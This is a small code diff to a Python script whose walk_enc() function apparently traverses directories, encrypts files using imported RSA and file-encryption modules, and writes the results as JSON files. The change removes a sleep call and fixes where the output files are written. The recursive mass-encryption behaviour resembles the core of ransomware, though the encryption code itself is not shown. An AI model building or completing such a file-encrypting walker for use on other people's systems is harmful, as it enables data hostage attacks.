@@ -4,7 +4,6 @@
 
 import os
 import json
-import time
 import rsa_key
 import file_encryption as enc
 from base64 import b64encode
@@ -33,7 +32,6 @@ def main():
     
     # Start walk (encrypt)
     walk_enc()
-    time.sleep(10)
 
 def walk_enc():
     # Begin file walk
@@ -68,7 +66,8 @@ def walk_enc():
                     # Create JSON file
                     name, extension = os.path.splitext(file_name)
                     file_name_new = name + ".json"
-                    with open(file_name_new, "w") as file:
+                    file_path_new = os.path.join(dirName, file_name_new)
+                    with open(file_path_new, "w") as file:
                         # Init json file data
                         file_data = {}
                         
